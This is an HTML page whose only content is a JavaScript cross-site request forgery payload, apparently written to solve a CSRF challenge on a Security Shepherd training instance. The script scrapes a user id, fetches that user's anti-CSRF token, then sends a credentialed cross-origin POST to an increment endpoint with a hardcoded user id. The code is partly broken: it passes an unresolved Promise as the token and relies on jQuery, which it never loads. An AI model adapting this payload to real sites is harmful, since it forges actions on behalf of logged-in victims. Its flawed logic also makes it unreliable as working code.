<html>
    <head>
        <meta http-equiv="Content-Security-Policy"
              content="frame-ancestors 'self' https://security-shepherd.dev.inf.elasticnet.co;">

    </head>
    <body>
        <script>
            document.domain="security-shepherd.dev.inf.elasticnet.co";
            var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
            const regex = /Your csrf Token for this Challenge is: (.+) <br\/>/;
            const csrf=fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken?userId='+ userId)
                .then(resp=>resp.text())
                .then(body=>{
                                let match = body.match(regex);
                                return match[1];
                            })

            fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus', {
                method: 'POST',
                credentials: "include",
                mode: "no-cors",
                body: JSON.stringify({
                    "userId": "d35874530d87a07ad3cd5864affdf5736743f5ad",
                    "csrfToken": csrf,
                })
            });
        </script>
    </body>
</html>
